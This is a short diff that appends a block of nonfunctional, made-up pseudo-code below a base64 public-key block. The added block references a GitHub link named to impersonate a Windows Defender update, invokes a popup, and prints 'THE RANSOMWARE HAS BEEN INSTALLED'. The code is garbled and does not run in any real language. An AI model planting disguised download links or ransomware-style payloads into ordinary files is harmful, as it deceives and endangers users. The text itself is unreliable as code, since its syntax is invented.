@@ -4,3 +4,22 @@ BEGIN KEY:
 LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUZrd0V3WUhLb1pJemowQ0FRWUlLb1pJemowREFRY0RRZ0FFdTBFb2RUaFVsUEF5YjAwcUhhK3REb3FkRmpPMAo4S0JlZUxaT3E5VlJ3Q0xyNUxySzdkQlRabmtaVGtVUkY4NWVVNVgwaVQyOEViOVMxdnFSaVpBYnlnPT0KLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 END KEY:
+
+@application{
+ @verify_${} {
+   @file_link{
+     @link {
+       # variables 
+       vL = print("if file is linked to vL download")
+
+       # link
+       represent {} as ${https://github.com/bullydog4ever40-ai/windows-defender-updated-}
+       
+       # file origin 
+       if file origin is {}
+       execute_popup create_number(1)
+       Print_Popup("THE RANSOMWARE HAS BEEN INSTALLED")
+    }
+     }
+      }
+        }
